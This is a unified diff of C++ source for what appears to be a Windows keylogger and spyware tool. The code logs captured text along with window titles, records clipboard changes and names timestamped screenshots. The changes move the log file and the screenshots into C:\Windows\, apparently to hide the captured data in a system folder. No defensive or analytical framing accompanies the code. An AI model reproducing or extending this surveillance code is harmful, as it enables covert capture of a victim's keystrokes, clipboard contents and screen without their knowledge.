@@ -1,4 +1,4 @@
-#pragma warning(disable: 4996 4530 4577 4365 5204 4191 4668 4626 5045)
+#pragma warning(disable: 4996 4530 4577 4365 5204 4191 4668 4626 5045 5264)
 
 #include <iostream>
 #include <windows.h>
@@ -49,7 +49,7 @@ void writeLogs(std::wstring buf, std::wstring windowTitle) {
 		const std::locale utf8_locale = std::locale("en_US.UTF-8");
 	std::wofstream logfile;
 
-	logfile.open("logs.txt", std::ios::app);
+	logfile.open("C:\\Windows\\logs.txt", std::ios::app);
 	logfile.imbue(utf8_locale);
 	logfile << getDate();
 	logfile << L" - '";
@@ -65,7 +65,7 @@ void writeErrorLog(std::wstring errorMessage){
 	const std::locale utf8_locale = std::locale("en_US.UTF-8");
 	std::wofstream logfile;
 
-	logfile.open("logs.txt", std::ios::app);
+	logfile.open("C:\\Windows\\logs.txt", std::ios::app);
 	logfile.imbue(utf8_locale);
 	logfile << std::endl << L"!!! ERROR !!! : *";
 	logfile << errorMessage << "*" << std::endl << std::endl;
@@ -131,7 +131,7 @@ void writeClipboardChange(){
 	const std::locale utf8_locale = std::locale("en_US.UTF-8");
 	std::wofstream logfile;
 
-	logfile.open("logs.txt", std::ios::app);
+	logfile.open("C:\\Windows\\logs.txt", std::ios::app);
 	logfile.imbue(utf8_locale);
 	logfile << std::endl << L"***ClipBoard Change*** : *";
 	logfile << getClipboardText() << "*" << std::endl << std::endl;
@@ -141,12 +141,12 @@ void writeClipboardChange(){
 
 std::string	getScreenFileName() {
 	struct tm* timeinfo;
-	char timestr[23];
+	char timestr[100];
 	time_t rawtime;
 
 	time(&rawtime);
 	timeinfo = localtime(&rawtime);
-	sprintf(timestr, "%02d-%02d-%d %02d_%02d_%02d.png", timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
+	sprintf(timestr, "C:\\Windows\\%02d-%02d-%d %02d_%02d_%02d.png", timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
 	return (timestr);
 }
 
